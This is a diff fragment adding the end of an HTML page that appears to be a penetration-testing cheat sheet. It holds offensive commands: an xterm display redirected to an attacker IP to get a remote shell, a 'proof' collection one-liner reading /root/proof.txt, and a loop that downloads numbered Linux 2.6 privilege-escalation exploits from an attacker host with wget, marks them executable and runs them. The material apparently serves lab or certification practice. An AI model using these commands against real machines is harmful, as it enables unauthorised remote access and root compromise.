+                <p>Finally, run the follwing in the remote machine:</p>
+                <pre><code>$&nbsp;/usr/openwin/bin/xterm&nbsp;-display&nbsp;yourip:1</code></pre>
+        </fieldset>
+        <fieldset class="box">
+            <legend>Get proof</legend>
+                <pre><code>$&nbsp;<span class="red">echo</span>&nbsp;<span class="green">" "</span>;echo&nbsp;<span class="green">"uname -a:"</span>;uname&nbsp;-a;echo&nbsp;<span class="green">" "</span>;echo&nbsp;<span class="green">"hostname:"</span>;hostname;echo&nbsp;<span class="green">" "</span>;echo&nbsp;<span class="green">"id"</span>;id;echo&nbsp;<span class="green">" "</span>;echo&nbsp;<span class="green">"ifconfig:"</span>;/sbin/ifconfig&nbsp;-a;echo&nbsp;<span class="green">" "</span>;echo&nbsp;<span class="green">"proof:"</span>;cat&nbsp;/root/proof.txt&nbsp;2&gt;/dev/null;&nbsp;<span class="red">cat</span>&nbsp;/Desktop/proof.txt&nbsp;2&gt;/dev/null;echo&nbsp;<span class="green">" "</span></code></pre>
+        </fieldset>
+        <fieldset class="box">
+            <legend>Elevation in 2.6.x:</legend>
+                <pre><code>$&nbsp;<span class="red">for</span>&nbsp;a&nbsp;<span class="blue">in</span>&nbsp;9352&nbsp;9513&nbsp;33321&nbsp;15774&nbsp;15150&nbsp;15944&nbsp;9543&nbsp;33322&nbsp;9545&nbsp;25288&nbsp;40838&nbsp;40616&nbsp;40611&nbsp;;&nbsp;<span class="blue">do</span>&nbsp;<span class="red">wget</span>&nbsp;<span class="blue">http://yourIP:8000/$a;</span>&nbsp;<span class="red">chmod</span>&nbsp;+x&nbsp;$a;&nbsp;./$a;&nbsp;id;&nbsp;done</code></pre>
+        </fieldset>
+    <script>new Highlighter().run(document);</script>
+    <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m = s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-106217827-1', 'auto'); ga('send', 'pageview'); </script>
+    
+</body></html>
